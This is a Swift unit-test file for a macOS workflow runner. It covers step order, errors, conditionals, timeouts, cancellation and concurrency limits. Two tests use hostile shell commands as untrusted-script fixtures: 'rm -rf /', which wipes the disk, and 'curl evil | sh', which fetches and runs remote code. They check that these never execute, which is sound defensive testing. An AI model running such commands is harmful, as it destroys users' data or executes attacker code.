import XCTest
import MFCore
import MFUtilities
@testable import MFAutomation

final class WorkflowRunnerTests: XCTestCase {
    private var performer = MockPerformer()
    private var environment = MockEnvironment()

    override func setUp() {
        performer = MockPerformer()
        environment = MockEnvironment()
    }

    private func makeRunner(trusted: @escaping @Sendable (ScriptAction) -> Bool = { _ in true }) -> WorkflowRunner {
        WorkflowRunner(performer: performer, environment: environment, isScriptTrusted: trusted)
    }

    private func workflow(_ steps: [WorkflowStep], timeout: Double = 30, continueOnError: Bool = false) -> Workflow {
        Workflow(name: "Test", steps: steps, timeout: timeout, continueOnError: continueOnError)
    }

    // MARK: Sequencing

    func testStepsRunInOrderAndReportProgress() async {
        let progress = Locked([WorkflowProgress]())
        let flow = workflow([.action(.a), .delay(seconds: 2), .action(.b), .notify(title: "T", body: "B"), .action(.c)])
        let runID = UUID()
        let outcome = await makeRunner().run(flow, context: testContext, runID: runID) { update in
            progress.withLock { $0.append(update) }
        }
        XCTAssertEqual(outcome.status, .completed)
        XCTAssertTrue(outcome.succeeded)
        XCTAssertEqual(outcome.runID, runID)
        XCTAssertEqual(outcome.workflowID, flow.id)
        XCTAssertNil(outcome.error)
        XCTAssertNil(outcome.failedStepPath)
        XCTAssertEqual(performer.performed, [.a, .b, .c])
        XCTAssertEqual(performer.sources, [.workflow, .workflow, .workflow])
        XCTAssertEqual(environment.sleeps, [2])
        XCTAssertEqual(environment.notifications, ["T|B"])
        XCTAssertEqual(outcome.stepResults.map(\.path), [[0], [1], [2], [3], [4]])
        XCTAssertTrue(outcome.stepResults.allSatisfy(\.succeeded))
        XCTAssertEqual(outcome.duration, 2, accuracy: 0.0001)
        XCTAssertEqual(outcome.stepResults[1].duration, 2, accuracy: 0.0001)
        XCTAssertEqual(progress.current.map(\.stepPath), [[0], [1], [2], [3], [4]])
        XCTAssertEqual(progress.current.map(\.summary), ["1 / 5", "2 / 5", "3 / 5", "4 / 5", "5 / 5"])
        XCTAssertTrue(progress.current.allSatisfy { $0.runID == runID && $0.workflowID == flow.id })
    }

    func testNoneActionIsANoOpAndRoutedActionsGoToEnvironment() async {
        let menu = Action.radialMenu(id: UUID())
        let prompt = Action.ai(templateID: UUID())
        let flow = workflow([.action(.none), .action(menu), .action(prompt), .action(.control(.openDashboard)), .action(.a)])
        let outcome = await makeRunner().run(flow, context: testContext, onProgress: nil)
        XCTAssertEqual(outcome.status, .completed)
        XCTAssertEqual(environment.routed, [menu, prompt, .control(.openDashboard)])
        XCTAssertEqual(performer.performed, [.a])
    }

    // MARK: Failures

    func testFailureStopsWorkflow() async {
        performer.fail(.b, with: .failed("boom"))
        let outcome = await makeRunner().run(workflow([.action(.a), .action(.b), .action(.c)]), context: testContext,
                                             onProgress: nil)
        XCTAssertEqual(outcome.status, .failed)
        XCTAssertEqual(outcome.error, .failed("boom"))
        XCTAssertEqual(outcome.failedStepPath, [1])
        XCTAssertEqual(performer.performed, [.a, .b])
        XCTAssertEqual(outcome.stepResults.map(\.error), [nil, .failed("boom")])
    }

    func testContinueOnErrorRunsRemainingSteps() async {
        performer.fail(.b, with: .unsupported("invalid command"))
        performer.fail(.c, with: .notFound("app"))
        let flow = workflow([.action(.a), .action(.b), .action(.c), .action(.d)], continueOnError: true)
        let outcome = await makeRunner().run(flow, context: testContext, onProgress: nil)
        XCTAssertEqual(outcome.status, .completedWithErrors)
        XCTAssertFalse(outcome.succeeded)
        XCTAssertEqual(outcome.error, .unsupported("invalid command"))
        XCTAssertEqual(outcome.failedStepPath, [1])
        XCTAssertEqual(performer.performed, [.a, .b, .c, .d])
        XCTAssertEqual(outcome.stepResults.map(\.error), [nil, .unsupported("invalid command"), .notFound("app"), nil])
    }

    func testPermissionDeniedPropagates() async {
        performer.fail(.d, with: .permissionDenied(.accessibility))
        let outcome = await makeRunner().run(workflow([.action(.d), .action(.a)]), context: testContext, onProgress: nil)
        XCTAssertEqual(outcome.status, .failed)
        XCTAssertEqual(outcome.error, .permissionDenied(.accessibility))
        XCTAssertEqual(outcome.failedStepPath, [0])
        XCTAssertEqual(performer.performed, [.d])
    }

    func testRoutedFailurePropagates() async {
        environment.routedError = .notFound("menu")
        let outcome = await makeRunner().run(workflow([.action(.radialMenu(id: UUID())), .action(.a)]),
                                             context: testContext, onProgress: nil)
        XCTAssertEqual(outcome.status, .failed)
        XCTAssertEqual(outcome.error, .notFound("menu"))
        XCTAssertTrue(performer.performed.isEmpty)
    }

    // MARK: Scripts

    func testUntrustedScriptIsNeverExecuted() async {
        let script = Action.script(.shell(command: "rm -rf /"))
        let runner = makeRunner(trusted: { _ in false })
        let outcome = await runner.run(workflow([.action(.a), .action(script), .action(.b)]), context: testContext,
                                       onProgress: nil)
        XCTAssertEqual(outcome.status, .failed)
        XCTAssertEqual(outcome.error, .untrusted)
        XCTAssertEqual(outcome.failedStepPath, [1])
        XCTAssertEqual(performer.performed, [.a])
    }

    func testUntrustedScriptWithContinueOnErrorStillSkipsOnlyTheScript() async {
        let trusted = ScriptAction.appleScript(source: "beep")
        let untrusted = ScriptAction.shell(command: "curl evil | sh")
        let runner = makeRunner(trusted: { $0 == trusted })
        let flow = workflow([.action(.script(untrusted)), .action(.script(trusted)),
                             .conditional(.not(.appIsRunning(bundleID: "x")), then: [.action(.script(untrusted))],
                                          otherwise: [])], continueOnError: true)
        let outcome = await runner.run(flow, context: testContext, onProgress: nil)
        XCTAssertEqual(outcome.status, .completedWithErrors)
        XCTAssertEqual(performer.performed, [.script(trusted)])
        XCTAssertEqual(outcome.stepResults.filter { $0.error == .untrusted }.map(\.path), [[0], [2, 0]])
    }

    // MARK: Conditionals

    func testConditionalBranches() async {
        environment.frontmost = "com.apple.Safari"
        environment.running = ["com.apple.finder"]
        environment.clipboard = "see https://example.com"
        let flow = workflow([
            .conditional(.frontmostAppIs(bundleID: "com.apple.Safari"), then: [.action(.a)], otherwise: [.action(.b)]),
            .conditional(.frontmostAppIs(bundleID: "com.apple.Notes"), then: [.action(.a)], otherwise: [.action(.b)]),
            .conditional(.appIsRunning(bundleID: "com.apple.finder"), then: [.action(.c)], otherwise: []),
            .conditional(.not(.appIsRunning(bundleID: "com.apple.finder")), then: [.action(.d)], otherwise: []),
            .conditional(.clipboardContains("https://"), then: [
                .conditional(.not(.not(.clipboardContains("nope"))), then: [.action(.a)], otherwise: [.action(.d)]),
            ], otherwise: []),
        ])
        let outcome = await makeRunner().run(flow, context: testContext, onProgress: nil)
        XCTAssertEqual(outcome.status, .completed)
        XCTAssertEqual(performer.performed, [.a, .b, .c, .d])
        XCTAssertEqual(outcome.stepResults.map(\.path), [[0, 0], [0], [1, 0], [1], [2, 0], [2], [3], [4, 0, 0], [4, 0], [4]])
    }

    func testClipboardIsOnlyReadForClipboardConditions() async {
        environment.clipboard = "secret"
        _ = await makeRunner().run(workflow([.action(.a), .conditional(.appIsRunning(bundleID: "x"), then: [.action(.b)],
                                                                        otherwise: [.action(.c)])]),
                                   context: testContext, onProgress: nil)
        XCTAssertEqual(environment.clipboardReads, 0)
    }

    func testFailureInsideBranchStopsWorkflow() async {
        performer.fail(.b, with: .failed("inner"))
        let flow = workflow([.conditional(.not(.appIsRunning(bundleID: "x")), then: [.action(.a), .action(.b), .action(.c)],
                                          otherwise: []), .action(.d)])
        let outcome = await makeRunner().run(flow, context: testContext, onProgress: nil)
        XCTAssertEqual(outcome.status, .failed)
        XCTAssertEqual(outcome.failedStepPath, [0, 1])
        XCTAssertEqual(performer.performed, [.a, .b])
    }

    // MARK: Waiting and timeouts

    func testWaitForAppSucceedsWhenAppComesToFront() async {
        environment.frontmost = "com.apple.finder"
        environment.bringToFront("com.apple.Safari", afterVirtualSeconds: 0.45)
        let outcome = await makeRunner().run(workflow([.waitForApp(bundleID: "com.apple.Safari", timeout: 5), .action(.a)]),
                                             context: testContext, onProgress: nil)
        XCTAssertEqual(outcome.status, .completed)
        XCTAssertEqual(performer.performed, [.a])
        XCTAssertEqual(environment.sleeps.count, 5, "polls every 0.1 s instead of spinning")
        XCTAssertTrue(environment.sleeps.allSatisfy { abs($0 - WorkflowLimits.waitForAppPollInterval) < 1e-9 })
    }

    func testWaitForAppReturnsImmediatelyWhenAlreadyFrontmost() async {
        environment.frontmost = "com.apple.Safari"
        let outcome = await makeRunner().run(workflow([.waitForApp(bundleID: "com.apple.Safari", timeout: 5)]),
                                             context: testContext, onProgress: nil)
        XCTAssertEqual(outcome.status, .completed)
        XCTAssertTrue(environment.sleeps.isEmpty)
    }

    func testWaitForAppTimesOut() async {
        environment.frontmost = "com.apple.finder"
        let outcome = await makeRunner().run(workflow([.waitForApp(bundleID: "com.apple.Safari", timeout: 2), .action(.a)]),
                                             context: testContext, onProgress: nil)
        XCTAssertEqual(outcome.status, .failed)
        XCTAssertEqual(outcome.error, .timedOut)
        XCTAssertEqual(outcome.failedStepPath, [0])
        XCTAssertTrue(performer.performed.isEmpty)
        XCTAssertEqual(outcome.duration, 2, accuracy: 0.11)
        XCTAssertLessThanOrEqual(environment.sleeps.count, 22)
    }

    func testWaitForAppTimeoutWithContinueOnError() async {
        let flow = workflow([.waitForApp(bundleID: "com.apple.Safari", timeout: 1), .action(.a)], continueOnError: true)
        let outcome = await makeRunner().run(flow, context: testContext, onProgress: nil)
        XCTAssertEqual(outcome.status, .completedWithErrors)
        XCTAssertEqual(outcome.error, .timedOut)
        XCTAssertEqual(performer.performed, [.a])
    }

    func testWorkflowTimeoutDuringDelay() async {
        let flow = workflow([.action(.a), .delay(seconds: 10), .action(.b)], timeout: 5, continueOnError: true)
        let outcome = await makeRunner().run(flow, context: testContext, onProgress: nil)
        XCTAssertEqual(outcome.status, .timedOut)
        XCTAssertEqual(outcome.error, .timedOut)
        XCTAssertEqual(outcome.failedStepPath, [1])
        XCTAssertEqual(performer.performed, [.a], "continueOnError must not outlive the workflow timeout")
        XCTAssertEqual(environment.sleeps, [5], "the delay is cut at the deadline")
        XCTAssertEqual(outcome.duration, 5, accuracy: 0.0001)
    }

    func testWorkflowTimeoutBetweenSteps() async {
        let flow = workflow([.delay(seconds: 3), .delay(seconds: 3), .delay(seconds: 3), .action(.a)], timeout: 7)
        let outcome = await makeRunner().run(flow, context: testContext, onProgress: nil)
        XCTAssertEqual(outcome.status, .timedOut)
        XCTAssertEqual(environment.sleeps, [3, 3, 1])
        XCTAssertTrue(performer.performed.isEmpty)
    }

    func testWorkflowTimeoutDuringWaitForApp() async {
        let flow = workflow([.waitForApp(bundleID: "com.apple.Safari", timeout: 60), .action(.a)], timeout: 2)
        let outcome = await makeRunner().run(flow, context: testContext, onProgress: nil)
        XCTAssertEqual(outcome.status, .timedOut)
        XCTAssertTrue(performer.performed.isEmpty)
    }

    func testWorkflowTimeoutInterruptsHangingAction() async {
        performer.hang(on: .a)
        let started = Date()
        let outcome = await makeRunner().run(workflow([.action(.a), .action(.b)], timeout: 1), context: testContext,
                                             onProgress: nil)
        XCTAssertEqual(outcome.status, .timedOut)
        XCTAssertEqual(outcome.error, .timedOut)
        XCTAssertEqual(outcome.failedStepPath, [0])
        XCTAssertEqual(performer.performed, [.a])
        XCTAssertLessThan(Date().timeIntervalSince(started), 10)
    }

    // MARK: Cancellation

    func testCancellationMidDelay() async {
        environment.blockSleeps = true
        let runner = makeRunner()
        let flow = workflow([.action(.a), .delay(seconds: 30), .action(.b)], timeout: 60)
        let runID = UUID()
        let task = Task { await runner.run(flow, context: testContext, runID: runID, onProgress: nil) }
        let env = environment
        await waitUntil { env.blockedSleepers == 1 }
        let isRunning = await runner.isRunning(workflowID: flow.id)
        XCTAssertTrue(isRunning)
        let cancelled = await runner.cancel(runID: runID)
        XCTAssertTrue(cancelled)
        let outcome = await task.value
        XCTAssertEqual(outcome.status, .cancelled)
        XCTAssertEqual(outcome.error, .cancelled)
        XCTAssertEqual(outcome.failedStepPath, [1])
        XCTAssertEqual(performer.performed, [.a])
        let count = await runner.activeRunCount
        XCTAssertEqual(count, 0)
        let again = await runner.cancel(runID: runID)
        XCTAssertFalse(again)
    }

    func testCancellingTheCallingTaskCancelsTheWorkflow() async {
        environment.blockSleeps = true
        let runner = makeRunner()
        let flow = workflow([.delay(seconds: 30), .action(.a)], timeout: 60, continueOnError: true)
        let task = Task { await runner.run(flow, context: testContext, onProgress: nil) }
        let env = environment
        await waitUntil { env.blockedSleepers == 1 }
        task.cancel()
        let outcome = await task.value
        XCTAssertEqual(outcome.status, .cancelled)
        XCTAssertTrue(performer.performed.isEmpty, "continueOnError must not continue after cancellation")
    }

    func testCancellationDuringHangingAction() async {
        performer.hang(on: .a)
        let runner = makeRunner()
        let flow = workflow([.action(.a), .action(.b)], timeout: 60)
        let task = Task { await runner.run(flow, context: testContext, onProgress: nil) }
        let mock = performer
        await waitUntil { mock.performed == [.a] }
        await runner.cancelAll()
        let outcome = await task.value
        XCTAssertEqual(outcome.status, .cancelled)
        XCTAssertEqual(performer.performed, [.a])
    }

    func testAlreadyCancelledTaskRunsNothing() async {
        let runner = makeRunner()
        let flow = workflow([.action(.a)])
        let task = Task { () -> WorkflowOutcome in
            withUnsafeCurrentTask { $0?.cancel() }
            return await runner.run(flow, context: testContext, onProgress: nil)
        }
        let outcome = await task.value
        XCTAssertEqual(outcome.status, .cancelled)
        XCTAssertTrue(performer.performed.isEmpty)
    }

    // MARK: Admission

    func testNestedWorkflowIsRejected() async {
        let nested = Action.workflow(id: UUID())
        let direct = await makeRunner().run(workflow([.action(.a), .action(nested)]), context: testContext, onProgress: nil)
        XCTAssertEqual(direct.status, .rejected)
        XCTAssertEqual(direct.error, .unsupported("Workflows cannot run other workflows."))
        let deep = await makeRunner().run(workflow([.action(.a), .conditional(.appIsRunning(bundleID: "x"), then: [],
                                                                               otherwise: [.action(nested)])]),
                                          context: testContext, onProgress: nil)
        XCTAssertEqual(deep.status, .rejected)
        XCTAssertTrue(performer.performed.isEmpty, "nothing runs before rejection")
        XCTAssertTrue(deep.stepResults.isEmpty)
    }

    func testInvalidWorkflowsAreRejected() async {
        let runner = makeRunner()
        let invalid: [Workflow] = [
            workflow([]),
            workflow([.delay(seconds: 0)]),
            workflow([.delay(seconds: 61)]),
            workflow([.delay(seconds: .nan)]),
            workflow([.action(.a)], timeout: 0),
            workflow([.action(.a)], timeout: .infinity),
            workflow(Array(repeating: .action(.a), count: 201)),
        ]
        for flow in invalid {
            let outcome = await runner.run(flow, context: testContext, onProgress: nil)
            XCTAssertEqual(outcome.status, .rejected)
            XCTAssertNotNil(outcome.error)
        }
        XCTAssertTrue(performer.performed.isEmpty)
    }

    func testSameWorkflowCannotRunTwiceConcurrently() async {
        environment.blockSleeps = true
        let runner = makeRunner()
        let flow = workflow([.delay(seconds: 30)], timeout: 60)
        let first = Task { await runner.run(flow, context: testContext, onProgress: nil) }
        let env = environment
        await waitUntil { env.blockedSleepers == 1 }
        let second = await runner.run(flow, context: testContext, onProgress: nil)
        XCTAssertEqual(second.status, .rejected)
        await runner.cancelAll()
        let firstOutcome = await first.value
        XCTAssertEqual(firstOutcome.status, .cancelled)
        // Once finished, the same workflow may run again.
        environment.blockSleeps = false
        let third = await runner.run(flow, context: testContext, onProgress: nil)
        XCTAssertEqual(third.status, .completed)
    }

    func testConcurrencyCap() async {
        environment.blockSleeps = true
        let runner = makeRunner()
        var tasks: [Task<WorkflowOutcome, Never>] = []
        for index in 0..<WorkflowLimits.maxConcurrentRuns {
            let flow = Workflow(name: "W\(index)", steps: [.delay(seconds: 30)], timeout: 60)
            tasks.append(Task { await runner.run(flow, context: testContext, onProgress: nil) })
        }
        let env = environment
        await waitUntil { env.blockedSleepers == WorkflowLimits.maxConcurrentRuns }
        let active = await runner.activeRunCount
        XCTAssertEqual(active, WorkflowLimits.maxConcurrentRuns)
        let extra = await runner.run(workflow([.action(.a)]), context: testContext, onProgress: nil)
        XCTAssertEqual(extra.status, .rejected)
        XCTAssertTrue(performer.performed.isEmpty)
        await runner.cancelAll()
        for task in tasks {
            let outcome = await task.value
            XCTAssertEqual(outcome.status, .cancelled)
        }
        let remaining = await runner.activeRunIDs
        XCTAssertTrue(remaining.isEmpty)
        environment.blockSleeps = false
        let afterwards = await runner.run(workflow([.action(.a)]), context: testContext, onProgress: nil)
        XCTAssertEqual(afterwards.status, .completed)
    }
}
